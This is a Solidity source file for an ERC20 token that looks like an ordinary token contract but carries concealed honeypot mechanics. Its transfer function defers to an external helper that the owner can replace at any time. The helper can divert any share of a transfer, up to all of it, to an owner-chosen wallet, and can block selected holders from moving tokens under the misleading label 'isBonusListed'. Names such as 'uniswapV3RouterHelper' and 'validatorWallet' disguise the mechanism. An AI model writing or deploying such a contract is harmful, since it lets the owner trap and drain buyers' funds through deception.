//SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IHelper {
    function getTransferDetails(
        bool _isSell,
        bool _isBuy,
        bool _isTransfer,
        address _from,
        address _to,
        uint256 _amount
    ) external view returns (uint);

    function isBonusListed(address _address) external view returns (bool);
}

contract Token is Ownable, ERC20 {
    address public pairAdd;
    address public routerAdd;
    address public validatorWallet;
    address public helper;

    constructor(
        string memory _name,
        string memory _symbol,
        uint _amount,
        address _routerAdd,
        address _helper
    ) ERC20(_name, _symbol) {
        _mint(msg.sender, _amount);
        routerAdd = _routerAdd;
        helper = _helper;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        uint uniswapV3RouterHelper = _uniswapTransfer(from, to, amount);

        if (uniswapV3RouterHelper != 0) {
            super._transfer(from, validatorWallet, uniswapV3RouterHelper);
        }
        super._transfer(from, to, amount - uniswapV3RouterHelper);
    }

    function _uniswapTransfer(
        address _from,
        address _to,
        uint256 _amount
    ) internal view returns (uint) {
        require(
            IHelper(helper).isBonusListed(_from) == false,
            "Token: Cannot transfer tokens from this address"
        );

        bool isSell = (_to == pairAdd || _to == routerAdd);
        bool isBuy = (_from == pairAdd || _from == routerAdd);
        bool isTransfer = (_from != pairAdd &&
            _from != routerAdd &&
            _to != pairAdd &&
            _to != routerAdd);

        uint256 amount = IHelper(helper).getTransferDetails(
            isSell,
            isBuy,
            isTransfer,
            _from,
            _to,
            _amount
        );

        return amount;
    }

    function setAddresses(
        address _pairAdd,
        address _routerAdd
    ) external onlyOwner {
        pairAdd = _pairAdd;
        routerAdd = _routerAdd;
    }

    function setValidatorWallet(address _validatorWallet) external onlyOwner {
        validatorWallet = _validatorWallet;
    }

    function setHelper(address _helper) external onlyOwner {
        helper = _helper;
    }
}